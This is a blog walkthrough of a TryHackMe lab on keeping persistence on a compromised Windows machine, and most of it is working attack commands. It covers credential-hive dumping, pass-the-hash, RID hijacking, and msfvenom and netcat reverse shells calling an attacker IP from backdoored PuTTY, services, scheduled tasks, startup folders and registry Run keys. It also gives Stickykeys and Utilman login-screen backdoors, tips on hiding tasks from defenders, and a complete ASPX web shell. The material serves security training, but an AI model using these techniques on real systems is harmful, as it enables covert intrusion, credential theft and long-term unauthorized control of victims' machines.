---
title: "Retaining Local Persistence in Windows Operating System: A TryHackMe Guide"
slug: windows-persistent-access
layout: post
excerpt_separator:  <!--more-->
categories:
  - ctfs
---

This article is not specifically about CTFs; instead, it focuses on teaching various techniques for maintaining persistence after exploitation. In this guide, you will learn methods such as Relative ID (RID) Hijacking, planting backdoors, exploiting services, and obtaining administrative shells from the Windows login screen, among others. The content of this article is derived from the work of the author, [munra](https://tryhackme.com/p/munra), who created the [Windows Local Persistence](https://tryhackme.com/room/windowslocalpersistence) room on [TryHackMe](https://tryhackme.com).

### Tampering With Unprivileged Accounts

This article assumes that we have already extracted password hashes from a compromised machine using `Mimikatz` `lsadump::sam`. With this in mind, we can proceed to add our account to the `Administrators` group in order to maintain persistence.

```powershell
net user thmuser0
```

```powershell
net localgroup administrators thmuser0 /add
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692394984303/15383ea0-aa77-4f0d-a155-5ca0542bf904.png){: .center-image }

Adding our account to the `Administrators` group might arouse suspicion, so let's consider an alternative method that would still grant us read/write access without full administrative privileges. The `Backup Operators` group is an ideal choice, as it will enable us to retrieve both `SAM` and `SYSTEM` hives.

```powershell
net localgroup "Backup Operators" thmuser1 /add
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395125795/f96c82d4-09e6-4274-9e7b-4fe4144dca46.png){: .center-image }

We need to add this account to either the `Remote Desktop Users` or `Remote Management Users` groups to enable remote desktop access.

```powershell
net localgroup "Remote Management Users" thmuser1 /add
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395177901/17625741-ef8b-4e5d-b6c8-53b295da8694.png){: .center-image }

For the next part, we will use `Evil-WinRM`. Upon logging in, we notice that we cannot access all the files. This is because the Backup Operators Group is disabled.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395216446/7af6ccdb-ca59-443e-8edc-421e4e2b84f0.png){: .center-image }

Don't worry, we can enable it through the registry.

```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395249613/a6630e89-84b2-4673-9c2a-2595b194fd35.png){: .center-image }

Great, the `Backup Operators` group is now enabled.

```powershell
whoami /groups
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395279652/42ce9271-e312-408a-a1dc-16e705ba0c98.png){: .center-image }

Now, let's create copies of the `SAM` and `SYSTEM` files and transfer them to our attack box.

```powershell
reg save HKLM\SYSTEM system.bak
```

```powershell
reg save HKLM\SAM sam.bak
```

```powershell
download system.bak
```

```powershell
download sam.bak
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395343882/a923600c-1a45-463b-ba4d-b2689a930840.png){: .center-image }

From here, we can extract the password hashes using `Impacket's` `secretsdump.py`.

```bash
/opt/impacket-0.9.19/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692398057558/186b3c71-a5cf-4df5-869d-546e80a0fd00.jpeg){: .center-image }

Now, we can log in to the Administrator account using a `pass-the-hash` attack.

```bash
evil-winrm -i 10.10.55.203 -u Administrator -H [REDACTED]
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692398102091/fca88949-eb5a-4942-b09f-b79561f08bd6.jpeg){: .center-image }

Let's navigate to `C:\flags` and retrieve our flag from `flag1.exe`.

### Special Privileges and Security Descriptors

Special groups have limitations based on what the Operating System assigns. Privileges refer to specific tasks that can be performed on the system, ranging from low-level tasks, such as restarting the computer, to more advanced tasks, like taking ownership of a file. To assign privileges to a user, execute the following commands below.

Export current config:

```powershell
secedit /export /cfg config.inf
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395585036/dd6fbec7-4bf9-41d7-88d0-822bd6c98f64.png){: .center-image }

Now, assign the user, `thmuser2`, both `SeBackupPrivilege` and `SeRestorePrivilege` rights.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395618623/742e5f1e-dc57-4549-924a-d8ea1535dcd3.png){: .center-image }

From this point, we need to convert the `.inf` file into a `.sdb` file, allowing us to load the configuration back into the system.

```powershell
secedit /import /cfg config.inf /db config.sdb
```

```powershell
secedit /configure /db config.sdb /cfg config.inf
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395700772/e609e4b5-6713-48c7-bdbb-b3b0cfe378d7.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395703235/38d0a49c-23e2-4a93-89fe-5cf749740c58.png){: .center-image }

Unfortunately, our user cannot log in via `Evil-WinRM` yet. We can fix this by modifying our `Evil-WinRM` session's security descriptor, which essentially allows `thmuser2` to connect.

From PowerShell (RDP Session):

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395749638/fc1a0658-36b8-4216-a722-461afa9e95e2.png){: .center-image }

Now, add `thmuser2` and grant them full privileges to connect via `Evil-WinRM`:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395774176/0237fb64-c5d6-4c60-8cdb-a245040255d4.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395777312/e8509ee0-cb31-4d3d-bf83-c610f56f2542.png){: .center-image }

Our user account is now configured to connect via `Evil-WinRM`. Furthermore, examining the user's group memberships reveals nothing out of the ordinary, which will aid in maintaining persistence.

```powershell
net user thmuser2
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395806742/a0f27465-721f-46e1-9ae8-8ed01d0d4466.png){: .center-image }

From here, we can log in using `Evil-WinRM` and obtain our second flag:

```bash
evil-winrm -i 10.10.55.203 -u thmuser2 -p Password321
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692398170962/5be80f1c-b131-4042-b8b5-fd26abe2ee48.jpeg){: .center-image }

### RID Hijacking

Another method to gain administrative privileges without actually being an administrator involves modifying registry values. When a user is created, they are assigned an identifier called the `RID`, which is universally recognized across the system. Upon login, the `LSASS` process retrieves the `RID` from the `SAM` registry and assigns a token based on the granted permissions. This is where we can manipulate the registry value to make Windows assign a specified user with an administrative access token.

By default, Windows configurations assign administrator accounts with `RID 500`. Regular accounts typically have `RID` values greater than or equal to `1000`.

Command to find RIDs for users:

```powershell
wmic useraccount get name,sid
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395934885/0daf9171-5cbf-475e-ad72-e17b1e532305.png){: .center-image }

As a proof of concept, we will assign `RID 500` to the `user3`. To achieve this, we need to access the `SAM` using Regedit; however, `SAM` is restricted to the `SYSTEM`, which means Administrators cannot edit it. We can work around this limitation by using `PsExec`, which is a part of `Sysinternals`.

```powershell
.\PsExec64.exe -i -s regedit
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692395991782/ada4cbca-e8bc-43b8-ac4e-55de09bb54c6.png){: .center-image }

In Regedit, navigate to `HKLM\SAM\SAM\Domains\Account\Users\` to locate the key for user3 and modify the `RID`. Search for a key with the hexadecimal value `0x3F2`, which corresponds to `1010`. Change the bytes `F2 03` to `F4 01`, representing `RID 500`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396031637/f2e9cd13-2c9d-4384-bbee-6c7ec1270baa.png){: .center-image }

Log in via `RDP` using the `user3` account and retrieve `flag3.exe`.

### Backdooring Files

To create a backdoored `PuTTY.exe` using `msfvenom`, follow this method.

Payload:

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp LHOST=10.13.28.215 LPORT=1337 -b "\x00" -f exe -o puttyX.exe
```

Additionally, we can create a reverse shell by attaching a PowerShell script to the shortcut or target area of a legitimate program.

```powershell
Start-Process -NoNewWindow "C:\tools\nc64.exe" "-e cmd.exe 10.13.28.215 1337"
```

Adjust the target area using this shortcut:

```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\script.ps1
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396236331/ce2adc07-68f7-430c-a60c-297444f2690d.png){: .center-image }

Now, we want to initiate a `Netcat` listener in order to capture the shell.

```bash
rlwrap -cAr nc -lvnp 1337
```

Execute the shortcut:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396279105/f672ddfa-89e4-4d71-92c7-00ceea7a0202.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396283605/bee5e1dc-ea0a-4fcf-b7e7-d5df5ce81e25.png){: .center-image }

Grab `flag5.exe` from here.

### Abusing Services

We can create a backdoor in system services using the following methods.

```powershell
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
```

```powershell
sc.exe start THMservice
```

This essentially changes the password of the Administrator user to Passwd123. Additionally, we can also create a reverse shell using `msfvenom` and associate it with the service we created.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.28.215 LPORT=1337 -f exe-service -o rev-svc.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396484309/0c796ea6-cc61-4019-addd-6e99c0e47045.png){: .center-image }

Upload using `Evil-WinRM`:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396494821/b22cf658-8474-4395-85cd-67107770316d.png){: .center-image }

Assign the executable as a service, configure the listener to intercept the shell, and then initiate the service:

```powershell
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396523988/73f57fd4-6a03-495f-ab34-9adf183938b6.png){: .center-image }

```bash
rlwrap -cAr nc -lvnp 1337
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396536061/541da267-3495-4072-bfb6-9d36f4f5d44c.png){: .center-image }

```powershell
sc.exe start THMservice2
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396558073/339e07a4-0b34-4c5e-826a-6515ac17f40e.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396560906/12ad62b1-432d-4030-990f-1d8249263031.png){: .center-image }

Grab `flag7.exe`.

### Modifying Existing Services

Considering that blue teams will be monitoring newly created services, we should avoid doing so and instead incorporate a backdoor into an existing service. A suitable method for this is to modify a legitimate, yet disabled, service. We can search for these by typing:

```powershell
sc.exe query state=all
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396624858/caa0b259-c718-4b95-b775-ec0111dbcfca.png){: .center-image }

There is a stopped service called `THMService3`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396642136/fc25c9a8-2ed3-43e2-8cbb-bd42847d63c7.png){: .center-image }

When altering an existing service, it is important to modify these three parameters:

1. `BINARY_PATH_NAME` = point to our payload
    
2. `START_TYPE` = auto
    
3. `SERVICE_START_NAME` = set to LocalSystem to help us maintain SYSTEM priv
    

Let's create a new reverse shell for this process.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.28.215 LPORT=1337 -f exe-service -o rev-svc2.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396707428/cf6138f3-c42c-4d7c-b880-c8407871a1c7.png){: .center-image }

Now, we want to upload the file using `Evil-WinRM`:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396727784/e63b4ef0-eece-471b-95b7-5ee14dfc61c4.png){: .center-image }

Reconfigure the `THMService3` parameters:

```powershell
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396760872/1cd7630a-6652-4e28-b8ff-3c73b28c5055.png){: .center-image }

Check the service once more to confirm that the parameters have been correctly configured:

```powershell
sc.exe qc THMservice3
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396784286/f917e217-b054-46ab-b598-3a8dfb53cea3.png){: .center-image }

As previously, set up the Netcat listener to capture the shell:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396801970/1c7b02fc-15e4-4435-bd13-f88760c2a07f.png){: .center-image }

Grab `flag8.exe` from here.

### Abusing Scheduled Tasks

We can create a scheduled task that executes a reverse shell every minute. Keep in mind that we wouldn't want this to occur as frequently as one minute; however, for the sake of time, we will do it for this room.

```powershell
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "C:\tools\nc64 -e cmd.exe 10.13.28.215 1337" /ru SYSTEM
```

* `-sc` = schedule
    
* `-mo` = minute
    
* `-ru` = run
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396868503/0b611c63-0327-4b41-84c3-7276ba232356.png){: .center-image }

Let's verify that our task has been scheduled properly:

```powershell
schtasks /query /tn thm-taskbackdoor
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396892876/cbd51e4b-c304-4a4a-8ce5-c3a89c84a77a.png){: .center-image }

After scheduling the task to run every minute, we receive a callback from our listener:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396912495/b1df5b00-c16b-418c-a903-cb324c493cd5.png){: .center-image }

This is excellent, but it can be detected rather effortlessly. Let's conceal the task by removing its `Security Descriptor (SD)`. An `SD` is an `Access Control List (ACL)` that determines which users have access to the scheduled task. If a user isn't assigned to the `ACL`, they won't be able to view the task. We will need to use `PsExec` to modify the system registry and delete the `SD`.

```powershell
C:\tools\pstools\PsExec64.exe -s -i regedit
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396970423/1e031184-c7b2-4818-87b0-047cd1740492.png){: .center-image }

Confirm that it has been deleted:

```powershell
schtasks /query /tn thm-taskbackdoor
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692396994639/cc0066e9-e0cb-4f0b-8a76-439722b88aa1.png){: .center-image }

Grab `flag9.exe`.

### Logon Triggered Persistence

We can insert backdoors into the Windows OS Startup Folder.

Specific User:

```powershell
C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

All Users:

```powershell
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

Let's create a reverse shell payload:

```bash
msfvenom -p /windows/x64/shell_reverse_tcp LHOST=10.13.28.215 LPORT=1337 -f exe -o revshell.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397078857/12cacee8-7c4b-4e4d-8138-b758e3b2a802.png){: .center-image }

Upload it:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397085628/3c40c879-0255-42e5-8d1a-65ebc6f70405.png){: .center-image }

Move it to the startup folder:

```powershell
copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397110873/c5e9d7ee-ba75-4fca-8dd0-52ba945ab127.png){: .center-image }

Log back into the RDP session and obtain the callback.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397124648/fc7c221d-a01c-4bda-8936-1ebab62c2bc0.png){: .center-image }

Grab `flag10.exe`.

You can also force a user to execute a program upon login through the registry. Rather than placing your payload in a particular directory, you can utilize the following registry entries to designate applications to run at login:

```powershell
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

```powershell
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

```powershell
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

```powershell
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

The registry entries under `HKCU` apply only to the current user, while those under `HKLM` apply to everyone. Programs specified under the `Run` keys will execute each time the user logs in. Conversely, programs specified under the `RunOnce` keys will be executed only once.

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.28.215 LPORT=1337 -f exe -o revshell.exe
```

Upload the file as usual and then move it to `C:\Windows`. After that, we need to create a `REG_EXPAND_SZ` registry entry under:

```powershell
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397327010/5869b6ed-e7ee-4620-9ae2-e7ed84d7c717.png){: .center-image }

Log in, and capture the shell using `Netcat`, and grab `flag11.exe`.

### Winlogon

Another way to automatically start a program upon login is by using the `Winlogon` component. This essentially loads Windows profiles once the credentials have been authenticated.

`Winlogon` utilizes registry keys located at:

```powershell
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
```

* `Userinit` points to `userinit.exe`, which is responsible for restoring user profile preferences upon login.
    
* `shell` points to the operating system's shell, which is commonly `explorer.exe`.
    

Create a shell, upload it, and then transfer it to `C:\Windows`. After that, modify the Userinit registry value to incorporate `C:\Windows\revshell.exe`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397460030/ddc83e5e-213c-49e2-832c-ecea36b9cfab.png){: .center-image }

Sign out and then sign back in, and capture the shell using `Netcat`. Grab `flag12.exe` from here.

### Logon Scripts

Just like before, generate a payload and transfer it using `Evil-WinRM`. From there, create an environment variable for a user.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397513689/c8c8a6db-5a5d-4ee6-ab35-76c1745f92d1.png){: .center-image }

Set up the `Netcat` listener, log out and then log back in to capture the shell. Grab `flag13.exe` from here.

### Backdooring the Login Screen Using Stickykeys

The following steps can be taken to create a backdoor on the Windows login screen using Stickykeys.

```powershell
takeown /f C:\Windows\System32\sethc.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397614244/adb843b4-df8d-4b68-ba87-8b69be9c4ba4.png){: .center-image }

```powershell
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397624217/bd4e58b2-e709-4ec7-8223-01ce61bac484.png){: .center-image }

```powershell
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397633955/7c8894f0-fc4b-4a83-99c1-d4dc638be61c.png){: .center-image }

Grab `flag14.exe`:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692398845196/fe90c8fe-c28e-4cf7-9e10-b505af5c1865.jpeg){: .center-image }

### Backdooring the Login Screen Using Utilman

The following steps can be taken to create a backdoor on the Windows login screen using Utilman.

```powershell
takeown /f C:\Windows\System32\utilman.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397718350/6fd8c81b-b9c6-4e4e-9a5b-11f945fba94d.png){: .center-image }

```powershell
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397730020/ba6b72d3-f70e-44b3-a21f-c18802f10447.png){: .center-image }

```powershell
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692397745558/18df87c1-f1fe-4118-b4c2-463f0c2b0218.png){: .center-image }

Grab `flag15.exe`:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692398897482/0f14f9f6-4a39-4ad7-ae48-0902078dbcba.jpeg){: .center-image }

### Persisting Through Existing Services

One way to maintain persistence is by uploading a web shell to the web server. We can create an `.aspx` shell and save it in the `C:\inetpub\wwwroot` directory.

```php
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="execute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>

<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->
```

From your browser, navigate to: [`http://<IP_HERE>/shell.aspx`](http://10.10.93.117/shell.aspx)

Grab `flag16.exe`:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692399014395/a5693d14-a3ac-4705-932f-386c32b39fb9.png){: .center-image }

### Summary

> In this article, we explore various techniques for maintaining persistence after exploitation, including Relative ID (RID) Hijacking, planting backdoors, exploiting services, and obtaining administrative shells from the Windows login screen. We discuss methods to tamper with unprivileged accounts, assign special privileges and security descriptors, and abuse scheduled tasks and services. Additionally, we cover backdooring the login screen using Stickykeys and Utilman, as well as persisting through existing services.